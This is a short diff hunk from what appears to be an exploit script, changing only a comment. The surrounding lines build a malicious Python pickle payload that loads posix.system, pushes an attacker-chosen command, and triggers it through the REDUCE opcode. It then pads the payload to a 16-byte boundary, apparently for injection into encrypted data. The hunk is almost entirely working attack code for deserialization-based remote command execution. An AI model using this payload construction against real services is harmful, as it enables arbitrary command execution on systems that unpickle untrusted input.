@@ -103,7 +103,7 @@ if __name__ == '__main__':
 
     inject = b'cposix\nsystem\n' # push os.system (load_global)
     inject += b'(' # push mark (load_mark)
-    inject += b'X' + struct.pack('<I', len(cmd)) + cmd # push 'ls' (load_binunicode)
+    inject += b'X' + struct.pack('<I', len(cmd)) + cmd # push cmd (load_binunicode)
     inject += b't' # stack[k:] = [tuple(stack[k+1:])] (load_tuple)
     inject += b'R' # stack[-2](stack[-1]) (load_reduce)
     inject += b'\x00' * ((16 - len(inject) % 16) % 16)
